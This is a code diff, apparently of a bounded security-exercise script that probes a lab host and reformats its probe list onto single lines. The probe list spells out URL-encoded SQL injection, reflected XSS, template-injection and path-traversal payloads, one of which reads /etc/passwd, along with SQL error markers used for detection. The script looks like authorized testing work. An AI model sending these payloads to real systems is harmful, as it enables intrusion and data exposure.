@@ -58,59 +58,19 @@ WRITE_PROBES = [
 ]
 
 # Ten bounded candidates -> three selected per run = exactly 30% of the suite.
-# These are observation-oriented canaries: no credential guessing, persistence,
-# destructive mutation, shell callback, or out-of-band exfiltration is attempted.
+# Observation-oriented canaries only: no credential guessing, persistence,
+# destructive mutation, shell callback, or out-of-band exfiltration.
 ACTIVE_EXPLOIT_PROBES = [
-    {
-        "name": "sqli_boolean_true",
-        "path": "/lab/embermesh.html?id=1%27%20OR%20%271%27%3D%271%27--",
-        "class": "sqli",
-    },
-    {
-        "name": "sqli_boolean_false",
-        "path": "/lab/embermesh.html?id=1%27%20AND%20%271%27%3D%272%27--",
-        "class": "sqli",
-    },
-    {
-        "name": "sqli_union_null",
-        "path": "/lab/embermesh.html?id=-1%20UNION%20SELECT%20NULL--",
-        "class": "sqli",
-    },
-    {
-        "name": "reflected_xss_svg",
-        "path": "/lab/lumenclause.html?q=%3Csvg%2Fonload%3Dalert%28%27SENJU_XSS_CANARY_1337%27%29%3E",
-        "class": "xss",
-    },
-    {
-        "name": "reflected_xss_img",
-        "path": "/lab/lumenclause.html?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27SENJU_XSS_CANARY_1337%27%29%3E",
-        "class": "xss",
-    },
-    {
-        "name": "ssti_jinja_canary",
-        "path": "/lab/orbitnotes.html?template=%7B%7B1337*2%7D%7D",
-        "class": "ssti",
-    },
-    {
-        "name": "ssti_dollar_canary",
-        "path": "/lab/orbitnotes.html?template=%24%7B1337*2%7D",
-        "class": "ssti",
-    },
-    {
-        "name": "path_traversal_plain",
-        "path": "/lab/archive-demo.txt?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "class": "path_traversal",
-    },
-    {
-        "name": "path_traversal_double_encoded",
-        "path": "/lab/archive-demo.txt?file=..%252F..%252F..%252F..%252Fetc%252Fpasswd",
-        "class": "path_traversal",
-    },
-    {
-        "name": "open_redirect_canary",
-        "path": "/lab/nullharbor.html?next=https%3A%2F%2Fexample.invalid%2Fsenju-canary",
-        "class": "redirect",
-    },
+    {"name": "sqli_boolean_true", "path": "/lab/embermesh.html?id=1%27%20OR%20%271%27%3D%271%27--", "class": "sqli"},
+    {"name": "sqli_boolean_false", "path": "/lab/embermesh.html?id=1%27%20AND%20%271%27%3D%272%27--", "class": "sqli"},
+    {"name": "sqli_union_null", "path": "/lab/embermesh.html?id=-1%20UNION%20SELECT%20NULL--", "class": "sqli"},
+    {"name": "reflected_xss_svg", "path": "/lab/lumenclause.html?q=%3Csvg%2Fonload%3Dalert%28%27SENJU_XSS_CANARY_1337%27%29%3E", "class": "xss"},
+    {"name": "reflected_xss_img", "path": "/lab/lumenclause.html?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27SENJU_XSS_CANARY_1337%27%29%3E", "class": "xss"},
+    {"name": "ssti_jinja_canary", "path": "/lab/orbitnotes.html?template=%7B%7B1337*2%7D%7D", "class": "ssti"},
+    {"name": "ssti_dollar_canary", "path": "/lab/orbitnotes.html?template=%24%7B1337*2%7D", "class": "ssti"},
+    {"name": "path_traversal_plain", "path": "/lab/archive-demo.txt?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd", "class": "path_traversal"},
+    {"name": "path_traversal_double_encoded", "path": "/lab/archive-demo.txt?file=..%252F..%252F..%252F..%252Fetc%252Fpasswd", "class": "path_traversal"},
+    {"name": "open_redirect_canary", "path": "/lab/nullharbor.html?next=https%3A%2F%2Fexample.invalid%2Fsenju-canary", "class": "redirect"},
 ]
 
 
@@ -121,8 +81,6 @@ def assert_authorized(url: str) -> None:
 
 
 class _SameAuthorizedHostRedirectHandler(urllib.request.HTTPRedirectHandler):
-    """Allow redirects only after checking the next hop against the fixed authorized host."""
-
     def redirect_request(self, req, fp, code, msg, headers, newurl):
         assert_authorized(newurl)
         return super().redirect_request(req, fp, code, msg, headers, newurl)
@@ -131,20 +89,10 @@ class _SameAuthorizedHostRedirectHandler(urllib.request.HTTPRedirectHandler):
 OPENER = urllib.request.build_opener(_SameAuthorizedHostRedirectHandler())
 
 
-def request(
-    method: str,
-    path: str,
-    body: bytes | None = None,
-    *,
-    extra_headers: dict[str, str] | None = None,
-    max_response_bytes: int = 1024 * 1024,
-) -> dict:
+def request(method: str, path: str, body: bytes | None = None, *, extra_headers: dict[str, str] | None = None, max_response_bytes: int = 1024 * 1024) -> dict:
     url = urllib.parse.urljoin(BASE + "/", path.lstrip("/"))
     assert_authorized(url)
-    headers = {
-        "User-Agent": "Senju-Authorized-Range-Exercise/1.1",
-        "X-Senju-Test": "synthetic-authorized-range",
-    }
+    headers = {"User-Agent": "Senju-Authorized-Range-Exercise/1.1", "X-Senju-Test": "synthetic-authorized-range"}
     if extra_headers:
         headers.update(extra_headers)
     if body is not None:
@@ -177,16 +125,7 @@ def request(
             "demo_password_exposed": "lab-pass-314" in text,
             "static_token_exposed": "DEMO_ATLAS_0000_NOT_A_SECRET" in text,
             "authorization_policy_present": "AUTHORIZED" in text.upper(),
-            "sql_error_marker": any(
-                marker in lowered
-                for marker in (
-                    "sql syntax",
-                    "sqlite error",
-                    "postgresql",
-                    "mysql error",
-                    "unclosed quotation",
-                )
-            ),
+            "sql_error_marker": any(marker in lowered for marker in ("sql syntax", "sqlite error", "postgresql", "mysql error", "unclosed quotation")),
             "xss_canary_reflected": "SENJU_XSS_CANARY_1337" in text,
             "ssti_canary_evaluated": "2674" in text,
             "passwd_marker": "root:x:" in lowered or "root:*:" in lowered,
@@ -195,55 +134,27 @@ def request(
 
 
 def _probe_rank(seed: str, probe: dict) -> str:
-    material = f"{seed}|{probe['name']}|{probe['path']}".encode("utf-8")
-    return hashlib.sha256(material).hexdigest()
+    return hashlib.sha256(f"{seed}|{probe['name']}|{probe['path']}".encode("utf-8")).hexdigest()
 
 
 def selected_active_exploit_probes(seed: str) -> list[dict]:
-    """Select exactly 30% of the fixed suite, hard-capped at three requests."""
     desired = max(1, (len(ACTIVE_EXPLOIT_PROBES) * ACTIVE_EXPLOIT_ROLLOUT_PERCENT) // 100)
     budget = min(MAX_ACTIVE_EXPLOIT_PROBES, desired)
-    ranked = sorted(ACTIVE_EXPLOIT_PROBES, key=lambda probe: _probe_rank(seed, probe))
-    return ranked[:budget]
+    return sorted(ACTIVE_EXPLOIT_PROBES, key=lambda probe: _probe_rank(seed, probe))[:budget]
 
 
 def run_active_exploit_pilot(seed: str) -> dict:
     selected = selected_active_exploit_probes(seed)
     interval = 1.0 / ACTIVE_EXPLOIT_MAX_RPS
     results: list[dict] = []
-
     for index, probe in enumerate(selected):
         try:
-            observation = request(
-                "GET",
-                str(probe["path"]),
-                extra_headers={
-                    "X-Senju-Active-Exploit": "bounded-nondestructive-v1",
-                    "X-Senju-Probe-Class": str(probe["class"]),
-                },
-                max_response_bytes=ACTIVE_EXPLOIT_MAX_RESPONSE_BYTES,
-            )
-            results.append({
-                "name": probe["name"],
-                "class": probe["class"],
-                "attempted": True,
-                "error": None,
-                **observation,
-            })
+            observation = request("GET", str(probe["path"]), extra_headers={"X-Senju-Active-Exploit": "bounded-nondestructive-v1", "X-Senju-Probe-Class": str(probe["class"])}, max_response_bytes=ACTIVE_EXPLOIT_MAX_RESPONSE_BYTES)
+            results.append({"name": probe["name"], "class": probe["class"], "attempted": True, "error": None, **observation})
         except Exception as exc:
-            # A redirect to a non-authorized host lands here before that next hop is followed.
-            results.append({
-                "name": probe["name"],
-                "class": probe["class"],
-                "attempted": True,
-                "method": "GET",
-                "url": urllib.parse.urljoin(BASE + "/", str(probe["path"]).lstrip("/")),
-                "error": f"{type(exc).__name__}: {str(exc)[:240]}",
-                "signals": {},
-            })
+            results.append({"name": probe["name"], "class": probe["class"], "attempted": True, "method": "GET", "url": urllib.parse.urljoin(BASE + "/", str(probe["path"]).lstrip("/")), "error": f"{type(exc).__name__}: {str(exc)[:240]}", "signals": {}})
         if index < len(selected) - 1:
             time.sleep(interval)
-
     signal_hits = {
         "sql_error_marker": sum(1 for row in results if row.get("signals", {}).get("sql_error_marker")),
         "xss_canary_reflected": sum(1 for row in results if row.get("signals", {}).get("xss_canary_reflected")),
@@ -279,10 +190,8 @@ def main() -> int:
     for method, path, body in WRITE_PROBES:
         observations.append(request(method, path, body))
         time.sleep(interval)
-
     run_seed = os.environ.get("SENJU_ACTIVE_EXPLOIT_SEED", "").strip() or str(int(time.time() // 1800))
     active_exploit = run_active_exploit_pilot(run_seed)
-
     report = {
         "schema": "senju-authorized-range-assault/v2",
         "target": BASE,
@@ -293,20 +202,15 @@ def main() -> int:
         "active_exploit": active_exploit,
         "summary": {
             "flag_surfaces": sum(1 for x in observations if x["signals"]["flag_marker"]),
-            "demo_credentials_exposed": any(
-                x["signals"]["demo_email_exposed"] or x["signals"]["demo_password_exposed"] for x in observations
-            ),
+            "demo_credentials_exposed": any(x["signals"]["demo_email_exposed"] or x["signals"]["demo_password_exposed"] for x in observations),
             "static_token_exposed": any(x["signals"]["static_token_exposed"] for x in observations),
-            "write_methods_accepted_2xx": [
-                x["method"] for x in observations if x["method"] in {"POST", "PUT", "PATCH", "DELETE"} and 200 <= x["status"] < 300
-            ],
+            "write_methods_accepted_2xx": [x["method"] for x in observations if x["method"] in {"POST", "PUT", "PATCH", "DELETE"} and 200 <= x["status"] < 300],
             "active_exploit_attempted": active_exploit["selected_probe_count"],
             "active_exploit_rollout_percent": ACTIVE_EXPLOIT_ROLLOUT_PERCENT,
             "active_exploit_signal_hits": active_exploit["signal_hits"],
         },
     }
-    out = Path("authorized-range-assault-report.json")
-    out.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
+    Path("authorized-range-assault-report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
     print(json.dumps(report["summary"], ensure_ascii=False, indent=2))
     return 0
 
